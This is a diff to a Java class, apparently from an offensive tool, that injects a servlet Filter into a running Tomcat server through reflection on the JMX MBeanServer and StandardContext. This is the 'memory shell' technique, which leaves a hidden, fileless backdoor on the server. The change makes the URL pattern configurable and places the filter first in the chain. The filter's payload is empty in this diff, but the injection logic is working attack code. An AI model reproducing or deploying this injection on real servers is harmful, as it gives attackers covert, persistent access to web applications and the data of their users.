@@ -22,10 +22,11 @@ import java.util.Set;
  * @author nu1r
  */
 public class TFMSFromJMXF implements Filter{
+    public static String pattern;
+
     static {
         try {
-            String filterName = "nu1r" + System.nanoTime();
-            String urlPattern = "/nu1r";
+            String filterName = String.valueOf(System.nanoTime());
 
             MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
             Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
@@ -85,7 +86,7 @@ public class TFMSFromJMXF implements Filter{
                     Object filterMap = filterMapClass.newInstance();
                     filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
                     filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
-                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
+                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, pattern);
                     //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                     standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
 
@@ -105,8 +106,7 @@ public class TFMSFromJMXF implements Filter{
     }
 
     @Override
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
     }
 
     @Override
